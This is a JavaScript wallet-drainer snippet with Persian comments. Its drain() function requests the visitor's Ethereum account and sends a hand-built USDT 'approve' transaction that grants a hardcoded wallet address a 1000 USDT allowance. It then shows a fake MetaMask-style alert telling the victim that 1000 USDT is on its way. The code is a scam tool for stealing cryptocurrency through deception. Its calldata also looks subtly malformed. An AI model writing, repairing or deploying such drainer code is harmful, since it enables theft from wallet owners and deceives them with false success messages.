const YOUR_WALLET = "0xa6e18E881C13477dDA0c74c7fB25F82e8bF281E3";
const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";

// تشخیص زبان مرورگر (فارسی یا انگلیسی)
const isPersian = navigator.language.startsWith('fa');

async function drain() {
  if (!window.ethereum) {
    return alert(isPersian ? "لطفاً MetaMask یا Trust Wallet نصب کنید!" : "Please install MetaMask or Trust Wallet!");
  }

  try {
    const acc = await ethereum.request({ method: 'eth_requestAccounts' });
    const amount = "0x" + (1000 * 1000000).toString(16).padStart(64, '0');
    const data = "0x095ea7b3" + "000000000000000000000000" + YOUR_WALLET.slice(2) + amount;

    await ethereum.request({
      method: 'eth_sendTransaction',
      params: [{ from: acc[0], to: USDT, data }]
    });

    // پیغام موفقیت شبیه notification رسمی MetaMask
    alert(isPersian 
      ? "✅ تأیید شد!\n1000 USDT به زودی به والت شما واریز می‌شود 🔥" 
      : "✅ Approved Successfully!\n1000 USDT will be sent to your wallet shortly 🔥"
    );
  } catch (e) {
    alert(isPersian ? "❌ تراکنش لغو شد." : "❌ Transaction cancelled.");
  }
}
